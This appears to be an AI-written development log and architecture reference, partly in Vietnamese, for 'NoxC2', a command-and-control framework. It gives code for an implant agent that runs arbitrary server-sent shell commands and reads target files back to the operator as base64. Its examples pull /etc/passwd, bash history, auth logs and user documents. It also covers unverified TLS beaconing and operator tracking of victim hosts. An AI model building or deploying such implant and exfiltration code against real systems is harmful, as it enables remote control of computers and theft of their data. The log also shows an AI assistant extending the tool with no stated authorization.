- REST API đầy đủ cho mọi tính năng CLI hiện có
- SSE realtime log stream từ server → browser
- Drag-and-drop file upload qua web
- Multi-agent selection/deselection qua web
- Shell command từ web
- Auto-reconnect khi mất SSE; fallback polling 10s

#### 🐛 Bug Fixes (2026-10-01)

| # | File | Lỗi | Root Cause | Fix |
|---|---|---|---|---|
| 1 | `http_transport.py` | GET `/command` block thread vĩnh viễn | `__wait_response(uuid)` không truyền timeout → `queue.get()` chờ vô hạn | Truyền `timeout=COMMAND_POLL_TIMEOUT` (50s); trả `204` nếu hết giờ |
| 2 | `http_transport.py` | POST `/message` bị nghẽn sau khi nhận result | Gọi `on_client` đồng bộ rồi chờ nhầm `__send_queues` (không có gì trong đó sau khi xử lý result) | Spawn `on_client` trong daemon thread, return `204` ngay lập tức |
| 3 | `frontend/index.html` | Danh sách agent không hiển thị trên web | Hàm `api()` gọi `r.json()` vô điều kiện — khi response là `204 No Content`, `r.json()` throw `SyntaxError`, bị catch trả `{ok: false}`, khiến `fetchClients()` bail sớm mà không render | Thêm kiểm tra status code + `Content-Type` trước khi parse JSON; trả `{ok: true}` với response `204` hoặc không có body |
| 4 | `core/server.py` | Server crash khi in output chứa HTML (vd: `curl https://google.com/`) | Rich library parse output như markup → HTML tags `[/?#]` được hiểu nhầm là rich closing tag → `MarkupError` | Import `rich.markup.escape` và escape output trước khi in: `safe_output = escape(str(result_data))` |
| 5 | `commands/__init__.py` | CLI không tìm thấy lệnh `agent.download` | Thiếu import `FileDownload` trong `commands/__init__.py` → decorator `@register` không chạy → class không được đăng ký vào `AGENT_COMMANDS` registry | Thêm dòng `from .agent.file_download import FileDownload` vào `commands/__init__.py` |

---

#### ✅ Phase 1 Features Completed (2026-10-01)

**Real Shell Execution** (`src/agent/test.py`)

Đã thay thế demo stubs bằng thực thi shell thực tế qua `subprocess.run()`:

```python
# Trước: hardcoded responses
def run_demo_command(command):
    if command == "whoami": return getpass.getuser()
    if command == "hostname": return socket.gethostname()
    # ...

# Giờ: real subprocess execution
def run_shell(command):
    result = subprocess.run(
        command,
        shell=True,          # Windows: cmd.exe /c, Unix: /bin/sh -c
        capture_output=True, # bắt stdout + stderr
        text=True,           # auto decode UTF-8
        timeout=30,          # timeout 30s
        env=os.environ.copy()
    )
    return (result.stdout + result.stderr).rstrip()
```

**Tính năng:**
- Cross-platform: Windows (`cmd.exe /c`) và Linux/Mac (`/bin/sh -c`)
- Timeout 30s để tránh agent treo
- Stdout + stderr được ghép lại (giống shell thông thường)
- Error handling đầy đủ: `TimeoutExpired`, `FileNotFoundError`, `OSError`
- Giữ nguyên special commands: `agent.exit`, `agent.upload` (dict format)
- Không cần dependency mới — pure stdlib (`subprocess`)

**Các lệnh giờ có thể chạy:**
- Network: `curl`, `ping`, `wget`, `nslookup`, `ipconfig`/`ifconfig`
- File ops: `dir`/`ls`, `cat`/`type`, `find`, `grep`
- System: `ps`, `tasklist`, `net user`, `whoami`, `systeminfo`
- Pipes & redirects: `curl https://... | grep ...`, `dir > output.txt`
- Compound: `whoami && hostname`, `cd /tmp; ls -la`

**Files changed:**
- `src/agent/test.py`: Thêm `import subprocess`, xóa `run_demo_command()`, thêm `run_shell()`
- `src/server/core/server.py`: Import `rich.markup.escape`, escape output trước khi in (fix bug #4)

---

**File Download (Agent → Server)** (`src/agent/download_handler.py`, `src/server/commands/agent/file_download.py`)

Đã implement tính năng download file từ agent về server:

```python
# Agent side: download_handler.py
def handle_download_file(remote_path):
    # Đọc file trên agent
    with open(remote_path, 'rb') as f:
        file_data = f.read()
    
    # Base64 encode và trả về
    return {
        "status": "success",
        "file_name": os.path.basename(remote_path),
        "file_path": remote_path,
        "file_size": len(file_data),
        "file_data": base64.b64encode(file_data).decode('utf-8')
    }

# Agent test.py: xử lý command
if command == 'agent.download':
    return handle_download_file(command_obj.get('remote_path'))

# Server side: tự động lưu file khi nhận response
def handle_file_download(uuid, addr, download_data):
    file_bytes = base64.b64decode(download_data['file_data'])
    downloads_dir = os.path.join("downloads", uuid)
    os.makedirs(downloads_dir, exist_ok=True)
    local_save_path = os.path.join(downloads_dir, file_name)
    with open(local_save_path, 'wb') as f:
        f.write(file_bytes)
```

**Tính năng:**
- Đọc file từ filesystem agent và encode base64
- Size limit 50MB (tránh memory issues)
- Server tự động lưu vào `downloads/<uuid>/<filename>`
- Error handling đầy đủ: `PermissionError`, `FileNotFoundError`, `OSError`
- CLI command: `agent.download <remote_path> [local_path]`
- REST API: `POST /api/download` với body `{remote_path}`
- Broadcast thông báo tới web dashboard qua SSE

**Use cases:**
```bash
# Download file cấu hình
agent.download /etc/passwd
agent.download C:\Windows\System32\drivers\etc\hosts

# Download log files
agent.download /var/log/auth.log
agent.download C:\Windows\System32\winevt\Logs\System.evtx

# Download user files
agent.download /home/user/.bash_history
agent.download C:\Users\Admin\Desktop\secret.docx
```

**Files changed:**
- `src/agent/download_handler.py`: NEW — xử lý đọc file và encode base64
- `src/agent/test.py`: Import `download_handler`, xử lý command `agent.download`
- `src/server/core/server.py`: Thêm `handle_file_download()` để tự động lưu file download
- `src/server/commands/agent/file_download.py`: NEW — CLI command `agent.download`
- `src/server/transport/api.py`: Thêm endpoint `POST /api/download`

**Limitations:**
- Max file size: 50MB (limit at agent side to avoid memory issues)
- Binary files safe (base64 encoding)
- No directory download support (single files only)
- No streaming (entire file loaded into RAM before sending)

---

## 20. Architecture Deep Dive: Command Execution & File Download

### 20.1. Command Execution Flow

**Overview:**
```
[Server CLI] → [ShellManager] → [Registry Lookup] → [Command Class] → [ClientSession] 
    ↓
[HTTP Transport] → [Agent] → [Handler/subprocess] → [Result] 
    ↓
[Server receives] → [handle_client] → [Print CLI + Broadcast SSE]
```

**Step-by-step execution:**

**1. User input parsing**
```python
# src/server/commands/interact/shell.py
def run(self):
    command = input().strip()  # User types: "agent.download /etc/passwd"
    Shell.handle_command(command)
```

**2. Registry lookup**
```python
# src/server/commands/interact/shell.py
@staticmethod
def handle_command(command):
    handler = command.split()
    cmd = handler[0]           # "agent.download"
    args = handler[1:]         # ["/etc/passwd"]
    
    # Lookup in registry dictionary
    if cmd in GROUPS['agent']:
        GROUPS['agent'][cmd].execute(*args)  # Call FileDownload.execute()
    else:
        print(f"[!] Command '{cmd}' not found")  # Command not registered!
```

**3. Registry system architecture**
```python
# src/server/commands/registry.py
AGENT_COMMANDS = {}  # {"agent.download": FileDownload instance, ...}
HOST_COMMANDS = {}
GENERAL_COMMANDS = {}

GROUPS = {
    'agent': AGENT_COMMANDS,
    'host': HOST_COMMANDS,
    'general': GENERAL_COMMANDS,
}

def register(command):
    """
    Decorator that auto-registers command into registry.
    Executes at CLASS DEFINITION TIME, not instantiation time.
    """
    group = command.group     # "agent"
    GROUPS[group][command.name] = command()  # AGENT_COMMANDS["agent.download"] = FileDownload()
    return command
```

**4. Command registration via decorator**
```python
# src/server/commands/agent/file_download.py
@register  # Decorator runs when Python loads class definition
class FileDownload(Command):
    name = "agent.download"
    description = "Download file from agent"
    group = "agent"
    
    def execute(self, *args):
        # Implementation...
```

**5. Import chain (critical for registration)**
```python
# src/server/commands/__init__.py
from .agent.file_upload import FileUpload       # ✅ Imported → decorator runs
from .agent.file_download import FileDownload   # ✅ Imported → decorator runs

# If FileDownload import is missing:
# → Module never loaded
# → Decorator never executes
# → Command not added to registry
# → Shell.handle_command() cannot find it
```

**Execution timeline:**
```
1. Server starts: python main.py
2. main.py imports: from commands import *
3. commands/__init__.py imports: from .agent.file_download import FileDownload
4. Python loads file_download.py:
   - Parses class definition
   - Sees @register decorator
   - Calls register(FileDownload)
   - Adds to GROUPS['agent']['agent.download'] = FileDownload()
5. User types: agent.download /etc/passwd
6. Shell lookup: if "agent.download" in GROUPS['agent']  # ✅ Found!
7. Execute: GROUPS['agent']['agent.download'].execute("/etc/passwd")
```

---

### 20.2. File Download Architecture (Agent → Server)

**Full data flow diagram:**

```
┌─────────────────────────────────────────────────────────────────┐
│ SERVER CLI                                                       │
│  > agent.download /etc/passwd                                   │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ FileDownload.execute()                                           │
│  1. Parse args: remote_path = "/etc/passwd"                     │
│  2. Get selected clients from ShellManager                       │
│  3. Loop through each client UUID                                │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ ClientSession.send_request()                                     │
│  message = {                                                     │
│    "type": "command",                                            │
│    "uuid": "<client-uuid>",                                      │
│    "message_id": "<unique-id>",                                  │
│    "timestamp": 1234567890,                                      │
│    "data": {                                                     │
│      "command": "agent.download",                                │
│      "remote_path": "/etc/passwd"                                │
│    }                                                             │
│  }                                                               │
│  serializer.encode(message) → JSON bytes                         │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼ (HTTP POST via transport.send())
┌─────────────────────────────────────────────────────────────────┐
│ HTTP Transport Layer                                             │
│  - Server queues message in __send_queues[uuid]                  │
│  - Agent long-polls GET /command (timeout 50s)                   │
│  - Server returns queued message from queue                      │
│  - Agent receives JSON response                                  │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ AGENT: src/agent/test.py                                         │
│  def run_agent():                                                │
│    while True:                                                   │
│      task = get_command()  # Long-poll GET /command             │
│      handle_task(task)                                           │
│                                                                   │
│  def handle_task(task):                                          │
│    command = task.get("data")                                    │
│    message_id = task.get("message_id")                           │
│    output = run_command(command)  # ← Route to handler          │
│    send_result(message_id, output)                               │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ run_command(command_obj)                                         │
│  if isinstance(command_obj, dict):                               │
│    command = command_obj.get('command')                          │
│                                                                   │
│    # Special command routing                                     │
│    if command == 'agent.upload':                                 │
│      return handle_upload_file(...)                              │
│                                                                   │
│    if command == 'agent.download':  # ← Our case                │
│      return handle_download_file(                                │
│        command_obj.get('remote_path')                            │
│      )                                                            │
│                                                                   │
│    # Default: shell execution                                    │
│    return run_shell(command)                                     │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ src/agent/download_handler.py                                    │
│                                                                   │
│  def handle_download_file(remote_path):                          │
│    # 1. Validate file existence                                  │
│    if not os.path.exists(remote_path):                           │
│      return {"status": "error", "message": "File not found"}     │
│                                                                   │
│    # 2. Check if it's a file (not directory)                     │
│    if not os.path.isfile(remote_path):                           │
│      return {"status": "error", "message": "Not a file"}         │
│                                                                   │
│    # 3. Check file size limit (50MB)                             │
│    file_size = os.path.getsize(remote_path)                      │
│    if file_size > 50 * 1024 * 1024:                              │
│      return {"status": "error", "message": "File too large"}     │
│                                                                   │
│    # 4. Read file binary                                         │
│    with open(remote_path, 'rb') as f:                            │
│      file_data = f.read()                                        │
│                                                                   │
│    # 5. Base64 encode (JSON-safe transport)                      │
│    encoded_data = base64.b64encode(file_data).decode('utf-8')    │
│                                                                   │
│    # 6. Return structured response                               │
│    return {                                                       │
│      "status": "success",                                         │
│      "file_name": os.path.basename(remote_path),                 │
│      "file_path": remote_path,                                   │
│      "file_size": file_size,                                     │
│      "file_data": encoded_data  # Base64 string                  │
│    }                                                              │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼ (return dict to test.py)
┌─────────────────────────────────────────────────────────────────┐
│ AGENT: test.py (continue)                                        │
│  output = handle_download_file(...)  # Got dict response         │
│  send_result(message_id, output)     # POST to /message          │
│                                                                   │
│  def send_result(message_id, output):                            │
│    send_json("/message", {                                       │
│      "type": "result",                                           │
│      "uuid": AGENT_ID,                                           │
│      "message_id": message_id,                                   │
│      "timestamp": int(time.time()),                              │
│      "data": output  # Dict with file_data                       │
│    })                                                             │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼ (HTTP POST /message)
┌─────────────────────────────────────────────────────────────────┐
│ SERVER: http_transport.py (/message endpoint)                    │
│  @app.route('/message', methods=['POST'])                        │
│  def message():                                                  │
│    uuid = request.headers.get('X-UUID')                          │
│    __recv_queues[uuid].put(request.get_data())                   │
│                                                                   │
│    # Spawn daemon thread to process result                       │
│    if __on_client:                                               │
│      t = threading.Thread(                                       │
│        target=__on_client,                                       │
│        args=(uuid, addr),                                        │
│        daemon=True                                               │
│      )                                                            │
│      t.start()                                                   │
│                                                                   │
│    return b'', 204  # Return immediately (no blocking)           │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼ (daemon thread)
┌─────────────────────────────────────────────────────────────────┐
│ SERVER: core/server.py handle_client()                           │
│  data = session.receive_response()  # Deserialize JSON           │
│  result_data = data['data']                                      │
│                                                                   │
│  # Detect file download response                                 │
│  if isinstance(result_data, dict) and \                          │
│     result_data.get('status') == 'success' and \                 │
│     'file_data' in result_data:                                  │
│    # This is a download response, not shell output               │
│    self.handle_file_download(uuid, addr, result_data)            │
│  else:                                                            │
│    # Normal command result (string output)                       │
│    print(f"From {addr[0]}:\n{result_data}")                      │
└───────────────────┬─────────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ handle_file_download(uuid, addr, download_data)                  │
│  # 1. Extract metadata                                           │
│  file_name = download_data.get('file_name')                      │
│  file_size = download_data.get('file_size')                      │
│  remote_path = download_data.get('file_path')                    │
│  file_data_b64 = download_data.get('file_data')                  │
│                                                                   │
│  # 2. Decode base64                                              │
│  file_bytes = base64.b64decode(file_data_b64)                    │
│                                                                   │
│  # 3. Create download directory                                  │
│  downloads_dir = os.path.join("downloads", uuid)                 │
│  os.makedirs(downloads_dir, exist_ok=True)                       │
│                                                                   │
│  # 4. Save file to disk                                          │
│  local_save_path = os.path.join(downloads_dir, file_name)        │
│  with open(local_save_path, 'wb') as f:                          │
│    f.write(file_bytes)                                           │
│    f.flush()                                                     │
│    os.fsync(f.fileno())  # Force write to disk                   │
│                                                                   │
│  # 5. Print success message                                      │
│  print(f"[+] Downloaded: {remote_path}")                         │
│  print(f"    Saved: {local_save_path} ({file_size} bytes)")      │
│                                                                   │
│  # 6. Broadcast to web dashboard via SSE                         │
│  broadcast_log("success", f"Downloaded {file_name} from {addr}") │
└─────────────────────────────────────────────────────────────────┘
```

---

### 20.3. Why Base64 Encoding?

**Problem: JSON cannot transport binary data directly**

```python
# Binary file content (bytes)
b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR...'

# JSON only supports UTF-8 strings
# Trying to JSON.stringify() binary data → corrupts data or throws error
```

**Solution: Base64 encoding**

```python
# Base64 converts binary → ASCII text (JSON-safe)
import base64

# Encode (agent side)
file_bytes = b'\x89PNG\r\n\x1a\n\x00\x00...'
encoded = base64.b64encode(file_bytes).decode('utf-8')
# Result: "iVBORw0KGgoAAAANSUhEUgAA..." (safe string for JSON)

# Decode (server side)
decoded_bytes = base64.b64decode(encoded)
# Result: b'\x89PNG\r\n\x1a\n\x00\x00...' (original binary)
```

**Trade-offs:**

| Aspect | Impact |
|---|---|
| ✅ **Safe transport** | Works in JSON, no corruption |
| ✅ **Cross-platform** | No encoding issues (Windows/Linux) |
| ✅ **All file types** | Binary safe (.exe, .png, .pdf, .zip) |
| ❌ **Size increase** | ~33% larger (3 bytes → 4 chars) |
| ❌ **Memory usage** | Entire file loaded into RAM before encoding |
| ❌ **No streaming** | Cannot stream large files chunk-by-chunk |

**Why not use raw binary HTTP?**

- NoxC2 uses **JSON serializer** for all messages (uniform protocol)
- HTTP body is still JSON: `{"type": "result", "data": {...}}`
- Switching to binary would require dual transport modes
- Base64 keeps architecture simple and consistent

---

### 20.4. Debugging Command Registration Issues

**Symptom:**
```bash
[1 agent(s)]> agent.download /etc/passwd
[!] Command 'agent.download' not found
```

**Debug checklist:**

**1. Check registry contents**
```python
# Add temporary debug code in shell.py
@staticmethod
def handle_command(command):
    # Print available commands
    print(f"[DEBUG] Agent commands: {list(GROUPS['agent'].keys())}")
    # Output: ['shell', 'agent.upload', 'agent.exit']
    # Missing: 'agent.download'!
```

**2. Verify decorator execution**
```python
# Add debug print in file_download.py
@register
class FileDownload(Command):
    def __init__(self):
        print("[DEBUG] FileDownload registered!")  # Should print on server start
        super().__init__()
```

If `[DEBUG] FileDownload registered!` doesn't print → decorator didn't run → module not imported.

**3. Check import chain**
```python
# commands/__init__.py
from .agent.file_upload import FileUpload     # ✅ Present
from .agent.file_download import FileDownload  # ❌ Missing! (bug root cause)
```

**4. Fix and verify**
```python
# Add missing import
from .agent.file_download import FileDownload

# Restart server
# Check registry again
print(list(GROUPS['agent'].keys()))
# Output: ['shell', 'agent.upload', 'agent.download', 'agent.exit']  ✅
```

---

### 20.5. Key Takeaways

**Command execution:**
- Registry pattern: commands self-register via `@register` decorator
- Decorator runs at **class definition time** (import time), not instantiation
- Missing import in `__init__.py` → decorator never runs → command not found
- Always import new command classes in `commands/__init__.py`

**File download:**
- Agent reads file → base64 encode → send as JSON dict
- Server detects dict with `file_data` key → decode → save to `downloads/<uuid>/`
- Base64 required for JSON transport of binary data (+33% size overhead)
- 50MB limit to prevent memory exhaustion (entire file in RAM)
- No streaming support (trade-off for protocol simplicity)

**Best practices:**
1. Always import new command classes in `commands/__init__.py`
2. Test with `help` command after adding new commands
3. Use base64 for binary data in JSON protocols
4. Implement size limits for file operations
5. Add debug prints during development to verify registration

---

*Section 20 added: 2026-10-01 | By: AI assistant*

---

## 21. HTTPS / TLS Transport Implementation & Architecture (thêm 2026-10-06)

### 21.1. Tổng Quan
Hệ thống đã chính thức kích hoạt mã hoá đường truyền **HTTPS / TLS** toàn diện cho mọi tương tác giữa Server, Agent và Web Dashboard.

- **Server WSGI:** `make_server` của Werkzeug được cấu hình với `ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)`.
- **Tự động sinh Chứng chỉ Tự Ký (Auto Self-Signed Certs):** Hàm `ensure_ssl_certificates()` trong `config.py` tự động kiểm tra và sinh `certs/server.crt` & `certs/server.key` thông qua `openssl` CLI nếu chưa có.
- **Agent 100% Pure Python Stdlib:** Phía Agent (`src/agent/test.py`) sử dụng `ssl._create_unverified_context()` kết hợp `urllib.request.urlopen(..., context=_SSL_CONTEXT)`. Bỏ qua cảnh báo cert tự ký mà không cần cài đặt bất kỳ package ngoài nào.
- **Cấu hình môi trường (`.env`):**
  - `NOX_USE_HTTPS=true` (hoặc `false` để chạy HTTP plain text)
  - `NOX_SSL_CERT` / `NOX_SSL_KEY` (tuỳ chọn tuỳ biến đường dẫn cert)

### 21.2. Files Thay Đổi
| File | Loại | Mô tả |
|---|---|---|
| `.gitignore` | MODIFIED | Bổ sung bỏ qua thư mục `certs/`, `*.crt`, `*.key`, `*.pem` |
| `.env.example` | MODIFIED | Cập nhật cấu hình `NOX_USE_HTTPS`, `NOX_SSL_CERT`, `NOX_SSL_KEY` |
| `src/server/config/config.py` | MODIFIED | Thêm `USE_HTTPS`, `SSL_CERT_PATH`, `SSL_KEY_PATH`, `ensure_ssl_certificates()` |
| `src/server/config/__init__.py` | MODIFIED | Re-export các biến và hàm SSL mới |
| `src/server/transport/http_transport.py` | MODIFIED | Nạp `ssl_context` cho Werkzeug `make_server`, log `https://` |
| `src/agent/test.py` | MODIFIED | Import `ssl`, tạo `_SSL_CONTEXT`, truyền vào `urlopen(..., context=_SSL_CONTEXT)` |
| `.AI/agent.md` | MODIFIED | Cập nhật tài liệu toàn bộ kiến trúc và tính năng |

---

*Section 21 added: 2026-10-06 | By: AI assistant*

---

## 22. Modular Frontend Architecture & Dual-Theme System (thêm 2026-10-06)

### 22.1. Động Lực và Mục Tiêu Tái Cấu Trúc
Ban đầu, giao diện Operator Console được gom chung toàn bộ CSS, HTML và JS vào một file `index.html` duy nhất (~800 dòng). Khi tính năng mở rộng (thêm bảng điều khiển, Dark/Light mode, multi-target, file upload/download), cấu trúc nguyên khối (monolithic) gây khó khăn cho việc bảo trì, debug và mở rộng UI.

Frontend đã được tái cấu trúc thành kiến trúc mô-đun (Modular Architecture) rõ ràng, khoa học:
- **Tách biệt mối quan tâm (Separation of Concerns):** Phân chia rõ ràng giữa HTML Skeleton, CSS Design Tokens, Component Styles, Layout Panels, State Management, API Services và UI Rendering.
- **Không cần build step (Zero-Build Vanilla Stack):** Vẫn giữ nguyên nguyên tắc không dùng framework cồng kềnh (không React/Vue/Webpack/Vite), tận dụng chuẩn Native ES6 & CSS Custom Properties tải trực tiếp từ trình duyệt.
- **Dual-Theme Engine (Dark / Light Mode):** Hỗ trợ đổi giao diện linh hoạt với CSS Variables, ghi nhớ cài đặt qua `localStorage` và nạp sớm chống giật giao diện (FOUC).

### 22.2. Cấu Trúc Thư Mục và Trách Nhiệm Chi Tiết

```
src/server/frontend/
├── index.html                  # Khung DOM semantic, liên kết stylesheets và scripts
├── css/
│   ├── variables.css           # Bảng mã màu, design tokens cho Dark (:root) & Light ([data-theme="light"])
│   ├── base.css                # CSS reset, typography, app container grid, top header
│   ├── components.css          # UI widgets: Buttons, input fields, badges, tags, toasts, scrollbars
│   └── panels.css              # Layout các khối: Sidebar cards, Shell tab, Upload dropzone, Agents table, Activity Log strip
└── js/
    ├── theme.js                # Quản lý theme state, nạp sớm và sync localStorage
    ├── state.js                # Global reactive state (clients, selected, activeTab, file)
    ├── api.js                  # Service giao tiếp HTTP REST API và luồng SSE realtime
    ├── ui.js                   # Hàm render HTML: cards list, detail table, log entries, badges, toasts
    └── app.js                  # Bộ điều khiển chính: routing tabs, shell commands, upload, drag & drop, bootstrap
```

### 22.3. Dual-Theme Token System
Hệ thống sử dụng các CSS Custom Properties động được định nghĩa tập trung trong `variables.css`:

```css
/* Dark Mode mặc định */
:root {
  --bg-base:       #0b0d11;
  --bg-panel:      #111520;
  --bg-card:       #181d2b;
  --fg-1:          #f0f4fc;
  --accent:        #00d4ff;
  --green:         #22d3a0;
  --red:           #ff4e6a;
  /* ... */
}

/* Light Mode ghi đè khi thuộc tính data-theme="light" */
[data-theme="light"] {
  --bg-base:       #f4f6fa;
  --bg-panel:      #ffffff;
  --bg-card:       #f8fafc;
  --fg-1:          #0f172a;
  --accent:        #0084c7;
  --green:         #10b981;
  --red:           #ef4444;
  /* ... */
}
```

### 22.4. Phục Vụ Dynamic Static File trên Server
Tại `src/server/transport/api.py`, endpoint phục vụ static assets được định tuyến linh hoạt:

```python
_FRONTEND_DIR = Path(__file__).parent.parent / "frontend"

@api.route("/<path:filename>")
def static_files(filename):
    return send_from_directory(_FRONTEND_DIR, filename)
```

Điều này cho phép trình duyệt tải mọi tài nguyên `/css/*` và `/js/*` đúng MIME types tự động mà không cần thêm cấu hình web server phức tạp.

---

*Section 22 added: 2026-10-06 | By: AI assistant*

---

## 23. SQLite Database Architecture & Data Persistence (thêm 2026-10-08)

### 23.1. Tổng Quan & Công Nghệ
- **CSDL:** SQLite 3 (`noxc2.db`), 100% Zero-Dependency sử dụng Python stdlib `sqlite3`.
- **Concurrency & WAL Mode:** Để đảm bảo tính toàn vẹn khi Flask chạy đa luồng (`threaded=True`), SQLite kết nối qua Context Manager với các PRAGMA:
  - `PRAGMA journal_mode = WAL;` (Write-Ahead Logging cho phép nhiều luồng đọc đồng thời khi ghi).
  - `PRAGMA synchronous = NORMAL;` (Tối ưu I/O ghi đĩa).
  - `PRAGMA foreign_keys = ON;` (Kích hoạt khóa ngoại & Cascade Delete).
  - `PRAGMA busy_timeout = 15000;` (Chờ 15s nếu có lock thay vì báo lỗi).
- **Mô hình truy xuất:** Repository Pattern kết hợp Thread-safe Connection Context Manager tại `src/server/db/`.

### 23.2. Schema Database (5 Bảng)
1. **`agents`**: Lưu trữ các agents đã từng kết nối (`uuid`, `hostname`, `username`, `ip_address`, `port`, `os_type`, `arch`, `first_seen`, `last_beacon`, `status`).
2. **`tasks`**: Lưu danh sách lệnh phát từ Operator / Web API (`id`, `agent_uuid`, `command_type`, `command_payload`, `created_at`, `status`).
3. **`task_results`**: Lưu kết quả thực thi lệnh (`task_id`, `agent_uuid`, `output`, `return_code`, `received_at`).
4. **`file_transfers`**: Lịch sử truyền file 2 chiều (`id`, `agent_uuid`, `direction`, `remote_path`, `local_path`, `file_size`, `md5_hash`, `completed_at`).
5. **`audit_logs`**: Nhật ký hoạt động hệ thống (`id`, `level`, `message`, `created_at`).

### 23.3. Cấu Trúc Module Database
```
src/server/db/
├── __init__.py          ← Database class singleton, get_connection() context manager & re-exports
├── schema.py            ← DDL script và hàm init_db()
└── repository.py        ← AgentRepository, TaskRepository, FileTransferRepository, LogRepository
```

### 23.4. Các Điểm Tích Hợp Tự Động
- **Đăng ký Agent:** `Server.handle_register()` tự động gọi `AgentRepository.upsert_agent(...)`.
- **Gửi lệnh:** `ClientSession.send_request()` tự động tạo task trong `TaskRepository.create_task(...)`.
- **Nhận kết quả:** `Server.handle_client()` tự động cập nhật kết quả qua `TaskRepository.save_latest_result(...)`.
- **Upload / Download file:** Tự động lưu thông tin truyền file (remote_path, local_path, file_size, md5_hash) vào `FileTransferRepository`.
- **Thời gian thực beacon:** Cập nhật `AgentRepository.update_beacon(uuid)` và `ClientInfo.last_beacon_update()` khi agent poll lệnh hoặc gửi response.
- **Audit Logging:** Mọi lời gọi `broadcast_log()` tự động đồng bộ vào bảng `audit_logs`.

---

*Section 23 added: 2026-10-08 | By: AI assistant*

---

*Được tạo: 2026-10-01 | Cập nhật gần nhất: 2026-10-08*

